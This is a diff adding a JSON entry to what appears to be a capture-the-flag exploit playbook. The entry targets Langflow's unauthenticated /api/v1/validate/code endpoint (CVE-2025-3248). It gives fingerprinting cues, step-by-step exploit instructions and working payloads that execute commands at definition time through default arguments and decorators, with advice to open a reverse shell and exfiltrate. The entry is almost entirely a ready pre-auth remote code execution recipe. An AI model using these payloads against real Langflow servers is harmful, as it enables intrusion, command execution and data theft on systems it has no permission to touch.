@@ -1,0 +1,48 @@
+{
+  "id": "langflow-validate-code-preauth-rce",
+  "title": "Langflow /api/v1/validate/code Pre-Auth RCE (CVE-2025-3248)",
+  "vuln_pattern": "Langflow (< 1.3.0) code-validation endpoint compiles and executes attacker-supplied Python without authentication: code placed in a function's default argument or decorator runs at definition time, yielding pre-auth remote code execution.",
+  "fingerprint": [
+    "langflow",
+    "Langflow",
+    "AI workflow platform",
+    "/api/v1/validate/code",
+    "flow/component builder",
+    "validate/code returns syntax/exec results",
+    "openapi.json mentions validate/code",
+    "AI 工作流平台",
+    "编排调度"
+  ],
+  "exploit_steps": [
+    "Fingerprint Langflow (branding, /api/v1 routes, the flow builder) and locate the unauthenticated POST /api/v1/validate/code endpoint.",
+    "Craft a Python snippet whose payload executes at DEFINITION time (not call time), because the endpoint only compiles/validates: put the command in a function default argument or a decorator, e.g. `def x(a=os.system('...')): pass` or a decorator that runs the command.",
+    "POST the snippet as the 'code' field; the server exec()s the module body while validating, running your command.",
+    "Use the RCE to read the flag (reverse shell, or direct command output if reflected) and exfiltrate."
+  ],
+  "key_payloads": [
+    "POST /api/v1/validate/code  {\"code\": \"import os\\ndef f(a=os.popen('cat /flag').read()): pass\"}",
+    "canonical vulhub PoC (decorator + raise to REFLECT output in the error body): {\"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(['id']))\\\")\\ndef foo():\\n  pass\"}",
+    "decorator/default-arg variants: any expression evaluated at definition time — @exec(...), def f(a=__import__('os').popen(cmd).read()): pass",
+    "reverse shell via os/subprocess in a default-arg expression when output is not reflected"
+  ],
+  "category": "web",
+  "cve": [
+    "CVE-2025-3248"
+  ],
+  "tags": [
+    "langflow",
+    "preauth-rce",
+    "python-exec",
+    "validate-code",
+    "ai-platform"
+  ],
+  "source": "original: CVE-2025-3248 public advisory (validate/code default-arg exec method)",
+  "preconditions": [
+    "HTTP access to the Langflow API"
+  ],
+  "verify_oracle": "command output containing the flag is returned or exfiltrated",
+  "pitfalls": [
+    "a top-level statement may only be validated, not run — put the payload where it executes at DEFINITION (default arg / decorator)"
+  ],
+  "created_ts": 1786600000.0
+}
